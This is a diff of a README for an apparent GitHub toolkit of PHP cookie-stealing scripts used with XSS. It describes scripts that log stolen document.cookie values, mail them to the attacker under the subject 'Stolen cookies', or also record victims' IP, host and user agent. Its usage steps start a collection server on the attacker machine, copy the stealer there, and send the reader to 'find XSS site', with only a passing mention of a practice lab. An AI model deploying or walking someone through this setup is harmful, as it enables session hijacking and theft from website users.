@@ -1,23 +1,30 @@
-# CookieHeist
-PHP Cookie Stealing Scripts for use in XSS
+# hacksudo-cookies-stealer
+here we created PHP Cookie Stealing Scripts which use in XSS/stored/relfect
 
-1. Cookiesteal-simple.php - Records whatever "c" parameter holds, in example case the document.cookie string, writes value to log.txt. 
+1. **Cookiesteal-simple.php** - Records whatever "c" parameter holds, in example case the **document.cookie string,** writes value to **log.txt.** 
 
-2. Cookiemail.php - This version code will mail the cookies to hacker mail using the PHP() mail function with subject “Stolen cookies”.
+2. **Cookiemail.php** - This version code will mail the cookies to hacker mail using the PHP() mail function with subject “Stolen cookies”.
 
-3. Cookiesteal-v.php (verbose) - Collects the IP address, port number, host(usually computer-name), user agent and cookie.
+3. Cookiesteal-v.php (**verbose**) - **Collects the IP address, port numbe**r, **host**(usually computer-name), user agent and cookie.
 
-## Usage
-1. On the remote attacker machine, start the webserver (Apache2 in example):
+## How To Usage
+1. On the remote attacker machine, start the webserver (Apache2 in example),or you can use PHP server
+php -S attackerIP:80 ( user attacker ip , and port you can use 8080 also , but remeber your apache2 is stop )
+do this command at same path where you took your cookies script done your ready now ...
+now find XSS site , for practice purpose you can use Beebox , which is available at www.root-me.org , get XSS and use XSS paylaod which is given below of this README
+
+enjoy :D 
+www.hacksudo.com/contact
+vishal@hacksudo.com
 ```
 sudo service apache2 start
 ```
 2. Git clone the repo locally and then push the chosen "Cookie stealer" PHP script from local host to the attacking machine
 
 ```
-git clone https://github.com/RxSec/CookieHeist
+git clone https://github.com/hacksudo/hacksudo-cookies-stealer
 
-cd CookieHeist
+cd hacksudo-cookies-stealer
 
 sudo scp cookiestealer-simple.php username@AttackMachine:/var/www/html/
 
